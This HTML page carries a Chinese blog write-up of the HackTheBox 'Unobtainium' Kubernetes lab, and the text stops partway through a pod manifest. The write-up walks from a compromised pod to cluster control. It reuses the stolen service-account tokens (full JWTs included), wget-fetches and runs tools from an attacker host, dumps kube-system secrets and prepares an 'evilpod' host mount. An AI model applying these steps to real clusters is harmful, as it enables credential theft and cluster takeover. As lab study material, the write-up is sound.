@@ -1,0 +1,246 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>浅谈K8S攻防：从POD到控制集群 | Alex-null's Blog</title><meta name="author" content="Alex-null"><meta name="copyright" content="Alex-null"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="k8s确实在一定程度上抹平了普通公司与一流公司的基础设施差距，实现了故障自愈、自动扩缩容等功能。但是容器&#x2F;K8S安全上明显还有不少薄弱之处。 基础知识K8S常见部署应用的架构大致如下Unobtainium是第一个hackthebox的K8S靶机，本文主要聊聊进入K8S的pod后的操作。这个靶机涉及K8S的部分主要是进入POD后，现在正式开始。 流程进入环境首先进行信息收集，因为前期的扫描">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅谈K8S攻防：从POD到控制集群">
+<meta property="og:url" content="https://alex-null.github.io/2021/12/01/%E6%B5%85%E8%B0%88K8S%E6%94%BB%E9%98%B2%EF%BC%9A%E4%BB%8EPOD%E5%88%B0%E6%8E%A7%E5%88%B6%E9%9B%86%E7%BE%A4/index.html">
+<meta property="og:site_name" content="Alex-null&#39;s Blog">
+<meta property="og:description" content="k8s确实在一定程度上抹平了普通公司与一流公司的基础设施差距，实现了故障自愈、自动扩缩容等功能。但是容器&#x2F;K8S安全上明显还有不少薄弱之处。 基础知识K8S常见部署应用的架构大致如下Unobtainium是第一个hackthebox的K8S靶机，本文主要聊聊进入K8S的pod后的操作。这个靶机涉及K8S的部分主要是进入POD后，现在正式开始。 流程进入环境首先进行信息收集，因为前期的扫描">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2021-11-30T16:11:56.000Z">
+<meta property="article:modified_time" content="2022-03-09T16:17:19.221Z">
+<meta property="article:author" content="Alex-null">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://alex-null.github.io/2021/12/01/%E6%B5%85%E8%B0%88K8S%E6%94%BB%E9%98%B2%EF%BC%9A%E4%BB%8EPOD%E5%88%B0%E6%8E%A7%E5%88%B6%E9%9B%86%E7%BE%A4/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '浅谈K8S攻防：从POD到控制集群',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-10 00:17:19'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2022/03/08/FKDTEeyRA8c4vt6.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Alex-null's Blog</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">浅谈K8S攻防：从POD到控制集群</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-11-30T16:11:56.000Z" title="发表于 2021-12-01 00:11:56">2021-12-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-09T16:17:19.221Z" title="更新于 2022-03-10 00:17:19">2022-03-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BA%91%E5%8E%9F%E7%94%9F/">云原生</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="浅谈K8S攻防：从POD到控制集群"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><p>k8s确实在一定程度上抹平了普通公司与一流公司的基础设施差距，实现了故障自愈、自动扩缩容等功能。但是容器&#x2F;K8S安全上明显还有不少薄弱之处。</p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>K8S常见部署应用的架构大致如下<br /><img src="https://s2.loli.net/2022/03/09/Xs6ovGAngJUcHFT.png" alt="K8S常见应用架构.png"><br />Unobtainium是第一个hackthebox的K8S靶机，本文主要聊聊进入K8S的pod后的操作。这个靶机涉及K8S的部分主要是进入POD后，现在正式开始。</p>
+<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>进入环境首先进行信息收集，因为前期的扫描已经扫出了<br />确认处于docker环境<br /></p>
+<p><img src="https://s2.loli.net/2022/03/09/RUAPJMBIvW1593b.png" alt="dockerenv信息.png"></p>
+<p><img src="https://s2.loli.net/2022/03/09/SEJl8RniGbMVXxw.png" alt="cgroup信息.png"></p>
+<p><br />查看进程数量，发现相较一般的Linux少了很多，还可以看到很多其他人的进程在反弹<br /><img src="https://s2.loli.net/2022/03/09/6oPcwKe1vaHG9LC.png" alt="POD内进程.png"><br />进入一个POD信息第一步是收集serviceaccount<br />常见的位置是<br />&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount <br />&#x2F;var&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;ser</p>
+<p>因为最开始信息收集知道有etcd，所以确认猜测是主节点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /run/secrets/kubernetes.io/serviceaccount </span><br><span class="line">curl --cacert ca.crt --header <span class="string">&quot;Authorization: Bearer <span class="subst">$(cat token)</span>&quot;</span> -X GET https://10.10.10.235:8443/api   </span><br></pre></td></tr></table></figure>
+<p>api server访问成功<br /><img src="https://s2.loli.net/2022/03/09/d3Zk4OCKcBIW2ut.png" alt="访问api server.png"></p>
+<p>创建一个~&#x2F;.kube&#x2F;config，kubectl默认会从$HOME&#x2F;.kube目录下查找文件名为 config 的文件，config就是访问集群的配置<br />token 就是&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;token<br />certificate-authority-data 就是base64 的&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;ca.crt </p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Config</span></span><br><span class="line"><span class="attr">users:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">poorduck</span></span><br><span class="line">  <span class="attr">user:</span></span><br><span class="line">    <span class="attr">token:</span> <span class="string">eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tZ3YycHEiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjQwODNiNTAyLWU0ZGMtNGZiMC1iNzU1LTY0ZmU3ZGVkMzcxNSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mmkqCtOB3qHPkdybHAJuaLGpQk01UGqecZZO9TfMMeO02PO2CfXoeuRyR1I0BDmyJlxuzuDZdl0k6i0AsQF4DU3Ow_Rm-YZ5cIWDVV3tfuWIA0PvJsmlJqDC4X4OmbOIULLw4i5ckWO_0I35OhlRRLumnaRRrJKFaRnWA1H-zRyAPF3fBGtUuFJecHLNTOaDMyffvBCcblT5z4jjC7V4jKKG05NUNY4UNvvtCiFfevoeTfUzJ4L2dFtkOkHV8k_nC__eJu-CqOvLQlNAWgnJvhNLry_5IVGPxos80R0IC8gOto5bFx0WsSj5av56ff_1UsnDD68IG9uHdinOZC4xvA</span></span><br><span class="line"><span class="attr">clusters:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">cluster:</span></span><br><span class="line">    <span class="attr">certificate-authority-data:</span> <span class="string">LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUM1ekNDQWMrZ0F3SUJBZ0lCQVRBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwdGFXNXAKYTNWaVpVTkJNQjRYRFRJeE1ERXdOekV6TWpRME9Wb1hEVE14TURFd05qRXpNalEwT1Zvd0ZURVRNQkVHQTFVRQpBeE1LYldsdWFXdDFZbVZEUVRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTVRDCmozSE9PMXRhaE1PUHpkNjhuYUtoQmVpYUFaM2lxdC9TY25lZ1RnbEttdHo1RGFnRUQ1WWFqWk0rVXl2UEVxUSsKdSttYjFaYzFLYnJjMkZnM0M0OEJZN09JUDZHZk9YOTkwUERLSmhxWnRhT0FkY1U1R2ExYXZTK2wzZG82VjJrQwplVnN0d1g2U1ZJYnpHSkVVeE1VUGlac0Z0Nkhzdk43aHRQMVA1Z2V3d3Rnc1ZJWER5TGwvZVJmd0NuMlpXK24zCk5nQzRPSTg0empWSHBYbVhGYUdzZURIYi9FNHdLL04waE1EMERFVlBKc0VPb2dITTlMbmRVZ3lKbWhBdFdiRWoKMjUrSDhBd1FpMy84UFlORXNtdFNBVUV1V3RZMzZweC9zRDVDdGhpTmxOcGtCNXQ1YzFHSzkwRG15b2ZxQmdZdgo5d2tDTkdHWktwM0F4TU1OMm5zQ0F3RUFBYU5DTUVBd0RnWURWUjBQQVFIL0JBUURBZ0trTUIwR0ExVWRKUVFXCk1CUUdDQ3NHQVFVRkJ3TUNCZ2dyQmdFRkJRY0RBVEFQQmdOVkhSTUJBZjhFQlRBREFRSC9NQTBHQ1NxR1NJYjMKRFFFQkN3VUFBNElCQVFBSEpqbzhVYzNTSDFVbnNLU3daSlR1eWozNlcvbXNiTXIwcFNuM2RsRTZCb3V1a2hGMwo5R3htVmEyYW40L1ZGSmtBc1pTcUZVejFlNTJxdkpvRkpjWGVjNE1pTjZHWlRXdVVBOUQvanFpYXBuSFdlTzh4ClJHazRXTjY2WnJhTTBYM1BxYUhvK2NiZmhLT2xMOWprVXh2RSszQld1ajlwbHlEM245dEZlM2xuYXNEZnp5NE0KcTQ2NWl4UFpxRnFWY2h4UUZRK3BaMjRLaXFvUVc0bWFtL3g1RlB5MTMrTXc4SjR6Yjh2TGR1dkxRUjN3cFVHYgp2S1hkbktPTFdzaUV4eXJqcFpqWmJZQkw4YjcwNVhGRkd2bWFicDIxYUc4cHNCMVh2c0xpR0ZRRXF5RGZlRlJXCmhsN0twVUlTbDQrTnA1c0FpWE53dGJTREUrMjJRVnRaYnVEbgotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">https://10.10.10.235:8443/</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">unobtainium-cluster</span></span><br><span class="line"><span class="attr">contexts:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">context:</span></span><br><span class="line">    <span class="attr">cluster:</span> <span class="string">unobtainium-cluster</span></span><br><span class="line">    <span class="attr">user:</span> <span class="string">poorduck</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">context</span></span><br><span class="line"><span class="attr">current-context:</span> <span class="string">context</span></span><br><span class="line"><span class="attr">preferences:</span></span><br><span class="line">  <span class="attr">colours:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<p>查看命名空间 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get namespaces</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/03/09/fB8ru4SEDT1nmAb.png" alt="查看命名空间.png"><br />直接列出pods失败</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods -A</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/03/09/dYQtiFzRUslIpDC.png" alt="列出POD（失败）.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods -n dev</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/03/09/vNU3LZP4dh8OrbJ.png" alt="列出pods.png"><br />指定命名空间看，可以发现有三个pod，这三个应该同一个应用。<br><br />查看pod详细情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe pods -n dev</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/03/09/y217DeiFfvnk5X4.png" alt="查看pod详细情况.png"><br />看看这几个ip</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe pods -n dev | grep IP</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/03/10/wcyPsa7lBV4vgRQ.png" alt="查看pod IP.png"><br><br />查看dev命名空间权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl auth can-i --list </span><br><span class="line">kubectl auth can-i --list -n dev</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/03/10/H1sv8j7SBMz95ux.png" alt="查看dev命名空间权限.png"><br />再用cdk进行信息收集，上传cdk</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.16.6:8089/cdk_linux_amd64_upx</span><br><span class="line"><span class="built_in">chmod</span> +x cdk_linux_amd64_upx</span><br><span class="line">./cdk_linux_amd64_upx evaluate --full</span><br></pre></td></tr></table></figure>
+<p>输出信息不是很多，但是这里提示了.&#x2F;cdk kcurl和api server这点呼应了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2021/09/07 07:44:55 trying to list namespaces</span><br><span class="line">        success, the service-account have a high authority.</span><br><span class="line">        now you can make your own request to takeover the entire k8s cluster with `./cdk kcurl` <span class="built_in">command</span></span><br><span class="line">        good luck and have fun.</span><br></pre></td></tr></table></figure>
+<p>但是没利用成功，再用cdk对网段进行一次扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk_linux_amd64_upx probe 172.17.0.0-255 1-65535 100 500</span><br></pre></td></tr></table></figure>
+<p>但是cdk没有title信息，所以再用fscan试下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.16.6:8089/fscan_amd64</span><br><span class="line"><span class="built_in">chmod</span> +x fscan_amd64</span><br><span class="line">./fscan_amd64 -h 172.17.0.0/24</span><br></pre></td></tr></table></figure>
+
+
+
+<p>其他信息就没什么了，但是K8S应用一般是一堆pod对外提供服务，尝试相同的payload，尝试移动到别的pod试试，这个需要自己尝试,payload和前期获取pod权限的一样。<br />和猜想的一样，确实是相同的应用，再对新的pod上传一个kubectl </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.16.6:8089/kubectl</span><br><span class="line"><span class="built_in">chmod</span> +x kubectl </span><br><span class="line"><span class="built_in">cp</span>  kubectl /usr/bin/</span><br></pre></td></tr></table></figure>
+<p>查看serviceaccount</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /run/secrets/kubernetes.io/serviceaccount</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl auth can-i --list --token $(<span class="built_in">cat</span> token) --server https://10.10.10.235:8443 --certificate-authority ca.crt</span><br></pre></td></tr></table></figure>
+<p>没啥区别<br /><img src="https://s2.loli.net/2022/03/09/wvtDjUlucXN6fzQ.png" alt="serviceaccount新.png"></p>
+<p>查看其他命名空间信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl auth can-i --list -n kube-system --token $(<span class="built_in">cat</span> token) --server https://10.10.10.235:8443 --certificate-authority ca.crt</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/03/09/PIpDj1FRcL3AYkm.png" alt="kube-system命名空间.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /run/secrets/kubernetes.io/serviceaccount</span><br><span class="line">kubectl auth can-i --list -n kube-system --token $(<span class="built_in">cat</span> token) --server https://10.10.10.235:8443 --certificate-authority ca.crt</span><br><span class="line">kubectl get secrets -n kube-system --token $(<span class="built_in">cat</span> token) --server https://10.10.10.235:8443 --certificate-authority ca.crt</span><br></pre></td></tr></table></figure>
+<p>查看secret<br><img src="https://s2.loli.net/2022/03/09/v1Y2VrbSfHyF65a.png" alt="获取secrets.png"><br />获取其他信息。还是传个cdk，不过没什么特别的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.16.6:8089/cdk_linux_amd64_upx</span><br><span class="line"><span class="built_in">chmod</span> +x cdk_linux_amd64_upx</span><br><span class="line">./cdk_linux_amd64_upx evaluate --full</span><br></pre></td></tr></table></figure>
+<p>再把secret拉出来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get secrets -o yaml -n kube-system</span><br></pre></td></tr></table></figure>
+<p>使用c-admin-token-tfmp2 的secret</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe secrets/c-admin-token-tfmp2 -n kube-system</span><br></pre></td></tr></table></figure>
+
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>查看当前权限是否可以创建pod</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow auth can-i create pod</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/03/09/KxvjCqulrDo6gzL.png" alt="本地的一些镜像.png"></p>
+<p>这里先要查看一下有什么image</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">kubectl</span> <span class="string">describe</span>  <span class="string">pods</span>   <span class="string">--token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow</span>  <span class="string">-A</span> </span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/03/09/KxvjCqulrDo6gzL.png" alt="本地的一些镜像.png"><br>发现有localhost:5000&#x2F;node_server和localhost:5000&#x2F;dev-alpine这两个镜像，求个稳<br />新建一个evilpod.yaml，这里直接挂在容易点，反弹可能有问题</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span> </span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span 